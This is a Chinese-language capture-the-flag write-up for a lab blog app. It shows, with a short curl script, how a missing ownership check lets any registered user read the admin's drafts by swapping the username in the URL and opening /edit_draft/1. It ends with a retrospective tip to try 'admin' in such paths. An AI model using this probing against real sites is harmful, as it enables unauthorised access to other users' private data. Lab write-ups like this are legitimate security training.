## 题解

### 入口与指纹

`10.0.172.218:5003`，`Blog Raider`，`/register`、`/login`。登录后跳
`/<username>/drafts`，并有 `/create_draft`、`/edit_draft/<id>`。

### 关键观察

- 注册普通用户后，草稿列表路径里带用户名：`/u90/drafts`。
- 把用户名换成 `admin`：`/admin/drafts` 返回 200，列出 `edit_draft/1`。
- `GET /edit_draft/1` 直接渲染管理员草稿正文，没有归属校验。

### 利用链

```bash
T=$(head -1 .target)
# 注册并登录
curl -sS -c cj -b cj -X POST -d \
  'username=u1&password=Passw0rd!1&confirm_password=Passw0rd!1&submit=1' "http://$T/register"
curl -sS -c cj -b cj -X POST -d 'username=u1&password=Passw0rd!1&submit=1' "http://$T/login"
# 越权读
curl -sS -b cj "http://$T/admin/drafts"     # 看到 /edit_draft/1
curl -sS -b cj "http://$T/edit_draft/1" | grep -o 'flag{[^}]*}'
```

### flag 位置

管理员草稿 `id=1` 的正文（`edit_draft/1` 的 `<textarea>`）。

## 复盘

- 路径里带用户名/ID 的列表页，第一件事是换成 `admin`。
- 列表能看只是第一步，真正的数据在 `edit_*` 详情接口；两个都要试。
